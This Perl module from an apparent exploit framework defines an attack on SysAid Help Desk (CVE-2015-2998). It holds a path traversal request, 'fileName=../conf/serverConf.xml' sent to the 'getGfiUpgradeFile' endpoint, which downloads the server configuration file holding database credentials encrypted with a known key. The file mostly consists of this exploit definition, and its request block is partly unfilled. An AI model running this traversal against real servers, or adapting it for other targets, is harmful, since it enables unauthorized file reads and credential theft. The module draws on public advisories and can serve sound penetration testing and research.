package MSFExploits::Exploits::SYSAID::MSF::SysaidSqlCreds;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::SYSAID);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SysaidSqlCreds";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-2998",
  DESCRIPTION => "

        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated

        user to download arbitrary files from the system. This is used to download the server

        configuration file that contains the database username and password, which is encrypted

        with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.

        ",
  FILETITLE => "../conf/serverConf.xml",
  METHOD => "GET",
  MSF_MODULE => "sysaid_sql_creds",
  PATH => "fileName=../conf/serverConf.xml&",
  PATHS => ["getGfiUpgradeFile", "sysaid"],
  PAYLOAD => "?",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Jun/8",
    "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt",
  ],
  TITLE => "SysAid Help Desk Database Credentials Disclosure",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "SysAid path", VALUE => "/sysaid" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
